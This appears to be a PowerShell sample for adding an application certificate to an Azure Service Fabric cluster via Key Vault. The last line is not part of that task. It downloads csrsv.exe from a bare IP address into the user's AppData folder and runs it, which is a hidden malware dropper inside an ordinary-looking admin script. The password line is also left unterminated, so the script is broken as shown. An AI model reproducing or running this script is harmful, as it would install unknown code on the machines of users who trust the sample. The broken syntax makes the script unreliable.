

$clusterloc="SouthCentralUS"
$groupname="mysfclustergroup"
$clustername = "mysfcluster"
$vaultname = "mykeyvault"
$subname="$clustername.$clusterloc.cloudapp.azure.com"
$subscriptionID = 'subscription ID'


Connect-AzAccount
Get-AzSubscription -SubscriptionId $subscriptionID | Select-AzSubscription


$appcertpwd = ConvertTo-SecureString -String 'Password
$appcertfolder="c:\myappcertificates\"


Add-AzServiceFabricApplicationCertificate -ResourceGroupName $groupname -Name $clustername `
    -KeyVaultName $vaultname -KeyVaultResouceGroupName $groupname -CertificateSubjectName $subname `
    -CertificateOutputFolder $appcertfolder -CertificatePassword $appcertpwd
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

